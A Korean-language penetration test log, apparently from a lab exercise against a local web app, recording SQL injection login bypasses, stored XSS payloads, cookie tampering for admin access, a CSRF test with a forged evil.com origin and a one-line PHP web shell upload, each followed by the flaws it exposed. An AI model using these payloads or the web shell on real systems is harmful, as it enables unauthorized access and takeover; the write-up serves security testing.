# 공격 과정 기록

## 1. SQL Injection 공격

### 공격 대상
- URL: `http://192.168.0.28:3000/login`
- 파라미터: username, password

### 공격 과정
1. 기본 OR 기반 SQLi 테스트
   ```
   username: admin' OR '1'='1
   password: test
   ```
   결과: admin 계정으로 로그인 성공

2. 주석 기반 SQLi 테스트
   ```
   username: admin'--
   password: anything
   ```
   결과: admin 계정으로 로그인 성공

3. sqlmap 분석
   - 백엔드 DB: SQLite
   - 취약한 파라미터: username (POST)
   - 취약점 타입: boolean-based blind SQL injection

### 확인된 취약점
- 사용자 입력값 검증 없음
- Prepared Statement 미사용
- 에러 메시지 노출

---

## 2. XSS (Cross-Site Scripting) 공격

### 공격 대상
- URL: `http://192.168.0.28:3000/board`
- 파라미터: content (게시글 내용)

### 공격 과정
1. 기본 script 태그 테스트
   ```html
   <script>alert('XSS')</script>
   ```
   결과: 성공, 스크립트 실행됨

2. 이미지 태그 이벤트 핸들러
   ```html
   <img src=x onerror=alert('XSS2')>
   ```
   결과: 성공

3. SVG 태그
   ```html
   <svg onload=alert('XSS3')>
   ```
   결과: 성공

### 확인된 취약점
- Stored XSS (저장형 XSS)
- 출력 인코딩 없음
- Content-Security-Policy 없음

---

## 3. 쿠키 변조 공격

### 공격 대상
- 쿠키: isAdmin, user_id, user

### 공격 과정
1. isAdmin 쿠키 변조
   ```
   원본: isAdmin=false
   변조: isAdmin=true
   ```
   결과: 관리자 메뉴 노출 (/admin/users, /admin/products)

2. user_id 쿠키 변조 (IDOR)
   ```
   원본: user_id=5
   변조: user_id=1
   ```
   결과: admin 사용자 프로필 접근 가능

3. 관리자 기능 접근
   - `/admin/users` - 모든 사용자 목록 열람
   - `/admin/products` - 상품 정보 수정 가능

### 확인된 취약점
- 클라이언트 측 권한 관리
- 세션 기반 인증 미사용
- 서버 측 권한 검증 부재

---

## 4. CSRF (Cross-Site Request Forgery) 공격

### 공격 대상
- 모든 POST 엔드포인트

### 공격 과정
1. CSRF 토큰 확인
   결과: CSRF 토큰 없음

2. 외부 Origin 테스트
   ```bash
   curl -X POST http://192.168.0.28:3000/board \
     -H "Origin: http://evil.com" \
     -d "content=CSRF TEST"
   ```
   결과: 성공, 게시글 작성됨

### 확인된 취약점
- CSRF 토큰 미구현
- Origin/Referer 헤더 검증 없음
- SameSite 쿠키 속성 미설정

---

## 5. 파일 업로드 취약점

### 공격 대상
- URL: `http://192.168.0.28:3000/profile/upload`

### 공격 과정
1. PHP 웹쉘 업로드
   ```php
   <?php system($_GET["cmd"]); ?>
   ```
   결과: 성공, `/uploads/shell.php`로 접근 가능

2. HTML 파일 업로드
   ```html
   <script>alert("XSS")</script>
   ```
   결과: 성공, XSS 실행 가능

3. SVG 파일 업로드
   ```xml
   <svg onload="alert(1)"></svg>
   ```
   결과: 성공

### 확인된 취약점
- 파일 확장자 검증 없음
- MIME 타입 검증 없음
- 업로드 디렉토리에서 직접 실행 가능
- 파일명 무결성 검증 없음
